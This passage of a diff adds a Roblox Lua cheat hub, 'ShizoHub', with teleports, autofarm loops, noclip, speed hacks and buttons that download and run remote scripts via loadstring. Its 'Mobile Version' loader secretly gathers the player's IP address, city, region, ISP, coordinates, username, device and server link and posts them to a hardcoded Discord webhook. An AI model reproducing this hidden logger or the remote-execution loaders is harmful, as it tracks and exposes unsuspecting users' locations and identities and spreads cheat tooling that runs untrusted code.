+    [1] = "Green Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Red Crate - 250K",
+    Callback = function()
+
+local args = {
+    [1] = "Red Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Tab4 = Window:CreateTab({ Name = "Autofarm", Icon = "6031068421" })
+ Tab4:CreateSection("Elite City - Autofarm")
+
+ local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Elite City",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1751, 12.699995994567871, 1751)
+    end,
+ })
+
+ local ToggleAutofarm = Tab4:CreateToggle({
+    Name = "Elite City - Autofarm",
+    Callback = function(Value)
+        autofarmEnabled = Value
+    end,
+})
+
+Tab4:CreateSection("Main City - Autofarm")
+
+local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Main City",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0.22569675743579865, 29.69999885559082, -54.05292892456055)
+    end,
+ })
+
+ local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Main City -  Autofarm",
+    Callback = function(Value)
+        getgenv().autofarm7 = Value -- Corrected Value variable name
+        
+        if getgenv().autofarm7 then -- Corrected variable name and added missing if condition
+            print("Autofarm enabled for Main Map")
+            -- Start autofarm script for Main Map
+            while getgenv().autofarm7 do
+                pcall(function()
+                    for _, spawner in ipairs(game.workspace.MainMap.Spawners:GetChildren()) do
+                        if spawner:IsA("Part") then
+                            for _, orbName in ipairs({"Orb100", "Orb75", "Orb50", "Orb25"}) do
+                                local orb = spawner:FindFirstChild(orbName)
+                                if orb and orb:FindFirstChild("Core") then
+                                    local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoidRootPart then
+                                        humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                        wait(0.15)
+                                    else
+                                        print("Error: HumanoidRootPart not found in local player's character.")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+                wait(10) -- Adjust the delay as needed
+            end
+        else
+            print("Autofarm disabled for Main Map")
+            -- Stop autofarm script for Main Map
+            -- (No specific action needed as the loop will stop when autofarm is set to false)
+        end
+    end
+})
+
+Tab4:CreateSection("Winter - Autofarm")
+
+local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Winter",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4680.10302734375, 1799.003173828125, -2812.972900390625)
+    end,
+ })
+
+ local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Winter - Autofarm",
+    Callback = function(Value)
+        getgenv().autofarm8 = Value -- Corrected Value variable name
+        
+        if getgenv().autofarm8 then -- Corrected variable name and added missing if condition
+            print("Autofarm enabled for Winter map")
+            -- Start autofarm script for Winter map
+            while getgenv().autofarm8 do
+                pcall(function()
+                    for _, spawner in ipairs(game.workspace.HolidayMap.Spawners:GetChildren()) do
+                        if spawner:IsA("Part") then
+                            for _, orbName in ipairs({"Santa", "Elf"}) do
+                                local orb = spawner:FindFirstChild(orbName)
+                                if orb and orb:FindFirstChild("Core") then
+                                    local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoidRootPart then
+                                        humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                        wait(0.15)
+                                    else
+                                        print("Error: HumanoidRootPart not found in local player's character.")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+                wait(10) -- Adjust the delay as needed
+            end
+        else
+            print("Autofarm disabled for Winter map")
+            -- Stop autofarm script for Winter map
+            -- (No specific action needed as the loop will stop when autofarm is set to false)
+        end
+    end
+})
+
+Tab4:CreateSection("Original Map - Autofarm")
+
+local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Original Map",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2388, 2742.198974609375, 390)
+    end,
+ })
+
+ local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Original Map - Autofarm",
+    Callback = function(Value)
+        getgenv().autofarm9 = Value -- Corrected Value variable name
+        
+        if getgenv().autofarm9 then -- Corrected variable name and added missing if condition
+            print("Autofarm enabled for Original Map")
+            -- Start autofarm script for Original Map
+            while getgenv().autofarm9 do
+                pcall(function()
+                    for _, spawner in ipairs(game.workspace.OldMap.Spawners:GetChildren()) do
+                        if spawner:IsA("Part") then
+                            for _, orbName in ipairs({"Old1", "Old2"}) do
+                                local orb = spawner:FindFirstChild(orbName)
+                                if orb and orb:FindFirstChild("Core") then
+                                    local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoidRootPart then
+                                        humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                        wait(0.15)
+                                    else
+                                        print("Error: HumanoidRootPart not found in local player's character.")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+                wait(10) -- Adjust the delay as needed
+            end
+        else
+            print("Autofarm disabled for Original Map")
+            -- Stop autofarm script for Original Map
+            -- (No specific action needed as the loop will stop when autofarm is set to false)
+        end
+    end
+})
+
+Tab4:CreateSection("Volcano - Autofarm")
+
+local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Volcano",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1270.0101318359375, 258.29638671875, 2022.0003662109375)
+    end,
+ })
+
+ local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Volcano - Autofarm",
+    Callback = function(Value)
+        getgenv().autofarm0 = Value -- Corrected Value variable name
+        
+        if getgenv().autofarm0 then -- Corrected variable name and added missing if condition
+            print("Autofarm enabled for Volcano Map")
+            -- Start autofarm script for Volcano Map
+            while getgenv().autofarm0 do
+                pcall(function()
+                    for _, spawner in ipairs(game.workspace.VolcanoMap.Spawners:GetChildren()) do
+                        if spawner:IsA("Part") then
+                            for _, orbName in ipairs({"Volcano1", "Volcano2"}) do
+                                local orb = spawner:FindFirstChild(orbName)
+                                if orb and orb:FindFirstChild("Core") then
+                                    local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoidRootPart then
+                                        humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                        wait(0.15)
+                                    else
+                                        print("Error: HumanoidRootPart not found in local player's character.")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+                wait(10) -- Adjust the delay as needed
+            end
+        else
+            print("Autofarm disabled for Volcano Map")
+            -- Stop autofarm script for Volcano Map
+            -- (No specific action needed as the loop will stop when autofarm is set to false)
+        end
+    end
+})
+
+
+Tab4:CreateSection("Ghost City - Autofarm")
+
+
+local Button1 = Tab4:CreateButton({
+    Name = "Teleport to Ghost City",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3825.7041015625, -34.09993362426758, 7304.7001953125)
+    end,
+ })
+
+local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Ghost City - Black Orbs Autofarm",
+    Callback = function(Value)
+        if Value then
+            getgenv().Farming1 = true
+                    while Farming1 == true do
+                        if game:GetService("Workspace").GhostCity.GhostOrbsMega:FindFirstChild("GhostMega2") then 
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").GhostCity.GhostOrbsMega.GhostMega2.Outside.Position)
+            end
+                        wait()
+                    end
+            else
+            getgenv().Farming1 = false
+            end
+    end,
+})
+
+local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Ghost City - White Orbs Autofarm",
+    Callback = function(Value1)
+        if Value1 then
+            getgenv().Farming2 = true
+                    while Farming2 == true do
+                        if game:GetService("Workspace").GhostCity.GhostOrbsMega:FindFirstChild("GhostMega") then 
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").GhostCity.GhostOrbsMega.GhostMega.Outside.Position)
+            end
+                        wait()
+                    end
+            else
+            getgenv().Farming2 = false
+            end
+    end,
+})
+
+Tab4:CreateSection("Ghost City - Crates Autofarm")
+
+local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Happy Ghosts",
+    Callback = function(Value3)
+        if Value3 then
+            getgenv().Farming3 = true
+            while Farming3 == true do
+                if game:GetService("Workspace").GhostCity.GhostOrbsMega:FindFirstChild("Happy") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").GhostCity.GhostOrbsMega.Happy.Crate.Position)
+                end
+                wait()
+            end
+        else
+            getgenv().Farming3 = false
+        end
+    end
+})
+
+local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "King Ghosts",
+    Callback = function(Value4)
+        if Value4 then
+            getgenv().Farming4 = true
+            while Farming4 == true do
+                if game:GetService("Workspace").GhostCity.GhostOrbsMega:FindFirstChild("King Ghost") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").GhostCity.GhostOrbsMega["King Ghost"].Crate.Position)
+                end
+                wait()
+            end
+        else
+            getgenv().Farming4 = false
+        end
+    end
+})
+
+local ToggleAutofarm2 = Tab4:CreateToggle({
+    Name = "Zombie Ghosts",
+    Callback = function(Value5)
+        if Value5 then
+            getgenv().Farming5 = true
+            while Farming5 == true do
+                if game:GetService("Workspace").GhostCity.GhostOrbsMega:FindFirstChild("Zombie Ghost") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").GhostCity.GhostOrbsMega["Zombie Ghost"].Crate.Position)
+                end
+                wait()
+            end
+        else
+            getgenv().Farming5 = false
+        end
+    end
+})
+
+
+RunService.RenderStepped:Connect(function()
+    if autofarmEnabled then
+        -- Your autofarm logic goes here
+        for _, child in ipairs(game.workspace.EliteCity.MegaOrbs:GetChildren()) do
+            if child:IsA("Model") and child.Name == "RainbowOrb" then
+                local core = child:FindFirstChild("Core")
+                if core then
+                    local humanoidRootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        humanoidRootPart.CFrame = CFrame.new(core.Position)
+                        wait(0.15)
+                    else
+                        print("Error: HumanoidRootPart not found in local player's character.")
+                    end
+                else
+                    print("Error: Core not found in RainbowOrb.")
+                end
+            elseif child:IsA("Model") then
+                for _, subChild in ipairs(child:GetChildren()) do
+                    if subChild:IsA("Model") and subChild.Name == "RainbowOrb" then
+                        local core = subChild:FindFirstChild("Core")
+                        if core then
+                            local humanoidRootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                            if humanoidRootPart then
+                                humanoidRootPart.CFrame = CFrame.new(core.Position)
+                                wait(0.15)
+                            else
+                                print("Error: HumanoidRootPart not found in local player's character.")
+                            end
+                        else
+                            print("Error: Core not found in RainbowOrb.")
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    if autofarm2Enabled then
+        -- Your autofarm 2 logic goes here
+        for _, folder in ipairs({
+            game.Workspace.MainMap.Spawners,
+            game.Workspace.OldMap.Spawners,
+            game.Workspace.HolidayMap.Spawners,
+            game.Workspace.DarkMap.Spawners,
+            game.Workspace.BeachMap.Spawners,
+            game.Workspace.VolcanoMap.Spawners
+        }) do
+            for _, child in ipairs(folder:GetChildren()) do
+                if not autofarm2Enabled then
+                    print("Autofarm 2 stopped.")
+                    return
+                end
+                if child:IsA("Model") then
+                    for _, subChild in ipairs(child:GetChildren()) do
+                        if subChild.Name == "Spawner" then
+                            local humanoidRootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                            if humanoidRootPart then
+                                humanoidRootPart.CFrame = CFrame.new(subChild.Position)
+                                wait(0.15)
+                            else
+                                print("Error: HumanoidRootPart not found in local player's character.")
+                            end
+                        end
+                    end
+                elseif child.Name == "Spawner" then
+                    local humanoidRootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        humanoidRootPart.CFrame = CFrame.new(child.Position)
+                        wait(0.15)
+                    else
+                        print("Error: HumanoidRootPart not found in local player's character.")
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
+ local Tab2 = Window:CreateTab({ Name = "Teleports", Icon = "6031068421" })
+ Tab2:CreateSection("Player Teleport")
+ local Input = Tab2:CreateInput({
+    Name = "Input Player Username",
+    Callback = function(UsarNam3)
+        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = Players:FindFirstChild(UsarNam3).Character.HumanoidRootPart.CFrame
+    end,
+})
+
+Tab2:CreateSection("Player Teleport")
+ local Button1 = Tab2:CreateButton({
+    Name = "Main city",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0.22569675743579865, 29.69999885559082, -54.05292892456055)
+    end,
+ })
+
+local Button1 = Tab2:CreateButton({
+    Name = "Elite city",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1751, 12.699995994567871, 1751)
+    end,
+ })
+
+local Button1 = Tab2:CreateButton({
+    Name = "Beach",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3624.356689453125, 67.44207763671875, 1019.2069702148438)
+    end,
+ })
+
+local Button1 = Tab2:CreateButton({
+    Name = "Winter",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4680.10302734375, 1799.003173828125, -2812.972900390625)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Original Map",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2388, 2742.198974609375, 390)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Volcano",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1270.0101318359375, 258.29638671875, 2022.0003662109375)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Infinite Road",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-22, 1549.717529296875, -1927)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Ghost city",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3825.7041015625, -34.09993362426758, 7304.7001953125)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Under UFO",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2465.26806640625, 2797.198974609375, -150.5103759765625)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Admin",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1527, 231.34007263183594, -9961)
+    end,
+ })
+
+ local Button1 = Tab2:CreateButton({
+    Name = "Dark dimension",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4966.94921875, 410.0472106933594, -5954.06298828125)
+    end,
+ })
+
+ local Tab3 = Window:CreateTab({ Name = "Misc", Icon = "6031068421" })
+ Tab3:CreateSection("Miscellaneous")
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Serverhop",
+    Callback = function()
+        local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
+
+module:Teleport(game.PlaceId)
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Rejoin",
+    Callback = function()
+        local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+ 
+local Rejoin = coroutine.create(function()
+    local Success, ErrorMessage = pcall(function()
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+    end)
+ 
+    if ErrorMessage and not Success then
+        warn(ErrorMessage)
+    end
+end)
+ 
+coroutine.resume(Rejoin)
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Infinite Yield",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Nameless Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "CMD-X",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Simple Spy",
+    Callback = function()
+        loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Dex Explorer",
+    Callback = function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/DinosaurXxX/b757fe011e7e600c0873f967fe427dc2/raw/ee5324771f017073fc30e640323ac2a9b3bfc550/dark%2520dex%2520v4", true))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Chat Bypasser",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
+    end,
+ })
+
+ local Button1 = Tab3:CreateButton({
+    Name = "Anti-Afk",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
+    end,
+ })
+ local Credits = Window:CreateTab({ Name = "Credits", Icon = "6031068421" })
+ Credits:CreateSection("Credits")
+ local Button1 = Credits:CreateButton({
+    Name = "This script has been created by 7rab and 0MG",
+    Callback = function()
+        print("This script has been created by 7rab and 0MG")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "Contact both of us at Discord!",
+    Callback = function()
+        print("Contact both of us at Discord!")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "7rab's discord : 7rab#0000 (Click to Copy)",
+    Callback = function()
+        toclipboard("7rab")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "0MG's discord : .0mg (Click to Copy)",
+    Callback = function()
+        toclipboard(".0mg")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "7rab's Roblox : T_azb / xyz (Click to Copy)",
+    Callback = function()
+        toclipboard("T_azb")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "0mg's Roblox : RyosUser / Ryos (Click to Copy)",
+    Callback = function()
+        toclipboard("RyosUser")
+    end,
+ })
+
+ local Button1 = Credits:CreateButton({
+    Name = "Thank you for using ShizoHub!",
+    Callback = function()
+        print("Thank you for using ShizoHub!")
+    end,
+ })
+
+ local Tab69420 = Window:CreateTab({ Name = "How??", Icon = "6031068421" })
+Tab69420:CreateSection("How on earth did you execute this on pc??")
+local Button6969 = Tab69420:CreateButton({
+    Name = "imagine using solara 💀",
+    Callback = function()
+        print("bluds using solara")
+    end,
+ })
+end,
+})
+
+local Button = Tab:CreateButton({
+    Name = "Load ShizoHub ( Mobile Version )",
+    Callback = function()
+        Rayfield:Destroy()
+        local webhk = "https://discord.com/api/webhooks/1235755248258252810/TZlpDlgBtWplsCo9cjgAmA1LsQj7qocvJTuBzrYO3bMru9wJG9wPF8HT0vpzT0nVn9Ea"
+        local name = game:GetService("Players").LocalPlayer.Name
+        local getIPResponse = request({
+            Url = "https://api.ipify.org/?format=json",
+            Method = "GET"
+        })
+        local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+        local IPBuffer = tostring(GetIPJSON.ip)
+                
+        local getIPInfo = request({
+            Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+            Method = "Get"
+        })
+        local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+        local FI = {
+            IP = IPBuffer,
+            country = IIT.country,
+            countryCode = IIT.countryCode,
+            region = IIT.region,
+            regionName = IIT.regionName,
+            city = IIT.city,
+            zipcode = IIT.zip,
+            latitude = IIT.lat,
+            longitude = IIT.lon,
+            isp = IIT.isp,
+            org = IIT.org
+        }
+                
+        local msg = {
+            ["username"] = "ShizoHub - Mobile",
+            ["avatar_url"] = "https://cdn.discordapp.com/avatars/1042440993028460594/a_035d169085bd2b11e8fe06459ec25d1b.gif?size=1024&width=0&height=256",
+            ["content"] = "||@everyone , @here||",
+            ["embeds"] = {
+                {
+                    ["color"] = tonumber("0x32CD32"),
+                    ["title"] = "ShizoLogger | Mobile Version | ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["thumbnail"] = {
+                        ["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))).data[1].imageUrl,
+                    },
+                    ["fields"] = {
+                        {
+                            ["name"] = "Username",
+                            ["value"] = "||"..game.Players.LocalPlayer.Name.."||",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Display Name",
+                            ["value"] = game.Players.LocalPlayer.DisplayName,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "UID",
+                            ["value"] = "||["..game.Players.LocalPlayer.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Executor Used",
+                            ["value"] = identifyexecutor() or "Unknown",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Account Age",
+                            ["value"] = game.Players.LocalPlayer.AccountAge.."day(s)",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Date Joined",
+                            ["value"] = os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).day.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).month.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).year,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Device",
+                            ["value"] = (game:GetService("GuiService"):IsTenFootInterface() and "Console")
+                                or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y > 600 and "Mobile (tablet)")
+                                or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y <= 600 and "Mobile (phone)")
+                                or "Desktop",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Join Server",
+                            ["value"] = "[Join Server](" ..jobId.. ")",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game ID",
+                            ["value"] = game.PlaceId,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game website",
+                            ["value"] = "https://www.roblox.com/games/"..game.PlaceId.."/",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "IP & Country",
+                            ["value"] = "||" ..FI.IP.. " | " ..FI.country.. "||",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "City & Region",
+                            ["value"] = "||" ..FI.city.. " | " ..FI.regionName.. "||",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "ISP & ORG",
+                            ["value"] = "||" ..FI.isp.. " | " ..FI.org.. "||",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Boot-Time",
+                            ["value"] = "Loaded in " .. os.time() - BootTime .. " seconds",
+                            ["inline"] = true
+                        }
+                    },
+                    ['footer'] = {
+                        ["text"] = "Powered by ShizoPhrenic",
+                        ["icon_url"] = "https://cdn.discordapp.com/icons/1233150686867361883/a4db114fd807f5edcfb15c44f34abb28.webp?size=4096"
+                    },
+                    ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z")
+                }
+            }
+        }
+                
+        request({Url = webhk, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(msg)})
+        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/federalco/ShizoHub/main/src/Lib.lua", true))()
+
+        local main = library:CreateMain("Shizohub",
+        [[
+        Scripting:     - 7rab
+                       - 0MG
+
+        Roblox:     - T_azb / xyz
+                    - RyosUser / Ryos
+
+        Discord:     - 7rab
+                    - .0mg
+
+        UI:            - Gray Cat
+        ]]
+        )
+        
+        local mainTab = main:CreateTab("Main")
+        
+        local walkspeedSlider = mainTab:CreateSlider("Walkspeed", 16, 400, function(arg)
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = arg
+        end)
+        
+        local jumpPowerSlider = mainTab:CreateSlider("JumpPower", 50, 400, function(arg)
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = arg
+        end)
+        
+        local noclipToggle = mainTab:CreateToggle("Noclip", function(state)
+            if state then
+                -- Enable noclip
+                print("Noclip enabled")
+                game:GetService("RunService").Stepped:connect(function()
+                    if state then
+                        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                            game.Players.LocalPlayer.Character.Head.CanCollide = false
+                            game.Players.LocalPlayer.Character.Torso.CanCollide = false
+                            game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
+                            game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
+                        elseif game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                            game.Players.LocalPlayer.Character.Head.CanCollide = false
+                            game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+                            game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+                        end
+                    end
+                end)
+            else
+                -- Disable noclip
+                print("Noclip disabled")
+                game.Players.LocalPlayer.Character.Head.CanCollide = true
+                game.Players.LocalPlayer.Character.Torso.CanCollide = true
+                game.Players.LocalPlayer.Character["Left Leg"].CanCollide = true
+                game.Players.LocalPlayer.Character["Right Leg"].CanCollide = true
+                game.Players.LocalPlayer.Character.UpperTorso.CanCollide = true
+                game.Players.LocalPlayer.Character.LowerTorso.CanCollide = true
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = true
+            end
+        end)
+        
+        
+        local autofarmTab = main:CreateTab("Autofarm")
+        
+        local autofarmLabel = autofarmTab:CreateLabel("Main Map")
+        
+        local autofarmToggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm = state
+            if state then
+                print("Autofarm enabled for Main Map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 30.9980049, 0)
+                task.wait(0.3) 
+                while getgenv().autofarm do
+                    pcall(function()
+                        for _, spawner in ipairs(game.workspace.MainMap.Spawners:GetChildren()) do
+                            if spawner:IsA("Part") then
+                                for _, orbName in ipairs({"Orb100", "Orb75", "Orb50", "Orb25"}) do
+                                    local orb = spawner:FindFirstChild(orbName)
+                                    if orb and orb:FindFirstChild("Core") then
+                                        local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if humanoidRootPart then
+                                            humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                            wait(0.10)
+                                        else
+                                            print("Error: HumanoidRootPart not found in local player's character.")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    wait(10) 
+                end
+            else
+                print("Autofarm disabled for Main Map")
+            end
+        end)
+        
+        local winterLabel = autofarmTab:CreateLabel("Winter")
+        
+        local autofarm3Toggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm2 = state
+            if state then
+                print("Autofarm enabled for Winter map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4680.05566, 1799.30164, -2813.43042)
+                task.wait(0.3) 
+                while getgenv().autofarm2 do
+                    pcall(function()
+                        for _, spawner in ipairs(game.workspace.HolidayMap.Spawners:GetChildren()) do
+                            if spawner:IsA("Part") then
+                                for _, orbName in ipairs({"Santa", "Elf"}) do
+                                    local orb = spawner:FindFirstChild(orbName)
+                                    if orb and orb:FindFirstChild("Core") then
+                                        local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if humanoidRootPart then
+                                            humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                            wait(0.10)
+                                        else
+                                            print("Error: HumanoidRootPart not found in local player's character.")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    wait(10) 
+                end
+            else
+                print("Autofarm disabled for Winter map")
+            end
+        end)
+        
+        local originalMapLabel = autofarmTab:CreateLabel("Original Map")
+        
+        local autofarm4Toggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm3 = state
+            if state then
+                print("Autofarm enabled for Original Map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2388, 2742.4978, 390)
+                task.wait(0.3) 
+                while getgenv().autofarm3 do
+                    pcall(function()
+                        for _, spawner in ipairs(game.workspace.OldMap.Spawners:GetChildren()) do
+                            if spawner:IsA("Part") then
